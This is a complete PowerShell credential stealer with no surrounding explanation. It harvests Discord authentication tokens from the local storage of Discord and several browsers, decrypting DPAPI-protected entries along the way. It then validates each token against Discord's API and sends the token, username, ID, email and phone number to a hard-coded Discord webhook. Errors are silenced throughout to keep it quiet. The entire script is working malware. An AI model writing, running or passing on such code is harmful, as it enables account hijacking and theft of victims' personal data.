$ErrorActionPreference = 'SilentlyContinue'
$hook = 'https://discord.com/api/webhooks/1573590074497699964/wKpGGuFBS9WoZUF-LZjmv2hQsUJQaOcRkKGlHF5vJ8luTyGg9Ml8PacYIIcSgwUKqM_B'
$rx   = '[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}'
$h    = New-Object System.Collections.Generic.HashSet[string]

$paths = @(
 "$env:APPDATA\discord\Local Storage\leveldb",
 "$env:APPDATA\discordcanary\Local Storage\leveldb",
 "$env:APPDATA\discordptb\Local Storage\leveldb",
 "$env:APPDATA\discorddevelopment\Local Storage\leveldb",
 "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
 "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Storage\leveldb",
 "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
 "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
 "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
 "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb",
 "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
)

foreach ($p in $paths) {
  if (Test-Path $p) {
    Get-ChildItem $p -File | ForEach-Object {
      $b = [IO.File]::ReadAllBytes($_.FullName)
      $t = [Text.Encoding]::UTF8.GetString($b)
      [regex]::Matches($t,$rx) | ForEach-Object { [void]$h.Add($_.Value) }
      [regex]::Matches($t,'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)') | ForEach-Object {
        try {
          $raw = [Convert]::FromBase64String($_.Groups[1].Value)
          $dec = [Security.Cryptography.ProtectedData]::Unprotect($raw,$null,'CurrentUser')
          $s   = [Text.Encoding]::UTF8.GetString($dec)
          [regex]::Matches($s,$rx) | ForEach-Object { [void]$h.Add($_.Value) }
        } catch {}
      }
    }
  }
}

foreach ($tk in $h) {
  try {
    $u = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me' `
         -Headers @{Authorization=$tk;'User-Agent'='Mozilla/5.0'} -TimeoutSec 8
    $body = @{
      username = 'token-grabber'
      embeds   = @(@{
        title       = 'valid token'
        color       = 65280
        description = "``````"
        fields      = @(
          @{ name='token'; value="``$tk``"; inline=$false },
          @{ name='user';  value="$($u.username)#$($u.discriminator)"; inline=$true },
          @{ name='id';    value="$($u.id)"; inline=$true },
          @{ name='email'; value="$($u.email)"; inline=$false },
          @{ name='phone'; value="$($u.phone)"; inline=$false }
        )
        timestamp   = (Get-Date).ToUniversalTime().ToString('o')
      })
    } | ConvertTo-Json -Depth 6
    Invoke-RestMethod -Uri $hook -Method POST -ContentType 'application/json' -Body $body -TimeoutSec 10 | Out-Null
  } catch {}
}
